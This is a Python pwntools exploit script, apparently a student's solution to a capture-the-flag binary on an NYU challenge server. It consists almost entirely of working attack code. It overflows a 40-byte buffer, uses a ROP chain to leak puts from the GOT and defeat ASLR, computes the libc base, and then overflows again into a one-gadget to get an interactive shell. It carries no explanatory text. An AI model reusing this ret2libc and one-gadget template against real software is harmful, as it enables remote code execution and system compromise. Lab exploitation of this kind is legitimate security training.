from pwn import *
import sys

overflow = "A" * 40

#context.log_level = "debug"
context.terminal = "/bin/sh"

rpp = ELF('rop')
putsGOT = rpp.symbols['got.puts']
popRDI = p64(0x4006b3)
puts = p64(0x400638)

payload = "A" * 40 + ''.join(map(p64,(
0x4006b3, # pop rdi; ret
putsGOT, #puts in GOT
0x4004c0, #puts in PLT
rpp.sym.main # main
)))
#altPayload = overflow + puts + popRDI + p64(putsGOT)




'''
putInGOT = p64(0x601018)
putInPLT = p64(0x4004c0)
putLeakGadget = p64(0x4006b3)

putsInLIBC = p64(0x00007ffff7a649c0)
libc = ELF('libc-2.19.so')
libc_base = putsInLIBC - libc.symbols['puts']
sys_addr = hex(libc_base + libc.symbols['system'])

binsh = libc.data.find('/bin/sh\x00')
'''

REMOTE = 1
bridge = ELF(sys.argv[1])
if REMOTE:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1343)
    libc = ELF('libc-2.19.so')
    print(p.recvuntil(":"))
    p.sendline("joe215")
else:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process(sys.argv[1])
    #gdb.attach(p)

print(p.recvuntil("I took away all the useful tools..\n"))
#exploit = overflow + putsGOT
#exploit = overflow + putLeakGadget + putInGOT + putInPLT
print(payload)
p.sendline(payload)
putsInLIBC = p.recv(6)
print(putsInLIBC)
putsInLIBC += '\x00\x00'
print(hex(u64(putsInLIBC)))
print("PUTS IN LIBC", putsInLIBC)
libc_base = u64(putsInLIBC) - libc.symbols['puts']
print("BASE OF LIBC", hex(libc_base))
magicGadgetsRemote = [0x46428, 0x4647c, 0xe93e5, 0xea33d]
magicGadgetsLocal = [0x4f2c5, 0x4f322, 0x10a38c]
finalOverflow = "A" * 40 + p64(libc_base + magicGadgetsRemote[2])
print(finalOverflow)
p.sendline(finalOverflow)
p.interactive()
#p.interactive()
